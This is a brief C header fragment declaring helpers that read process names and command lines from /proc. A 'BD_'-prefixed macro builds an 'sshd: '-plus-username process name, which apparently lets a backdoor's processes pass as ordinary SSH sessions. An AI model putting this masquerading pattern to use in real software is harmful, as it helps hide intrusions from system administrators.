#define BD_SSHPROCNAME "sshd: "PAM_UNAME

#define CMDLINE_PATH      "/proc/%d/cmdline"
#define FALLBACK_PROCNAME "YuuUUU"
#define NAME_MAXLEN       64
#define CMDLINE_MAXLEN    128

#define PID_MAXLEN      150
#define PROCPATH_MAXLEN strlen(CMDLINE_PATH) + PID_MAXLEN

#define MODE_NAME     1
#define MODE_CMDLINE  2

char *get_cmdline(pid_t pid);
int  open_cmdline(pid_t pid);

char *procinfo(pid_t pid, int mode);
#define procname() procinfo(getpid(), MODE_NAME)
#define proccmdl() procinfo(getpid(), MODE_CMDLINE)

#include "proc.c"
#include "util.h"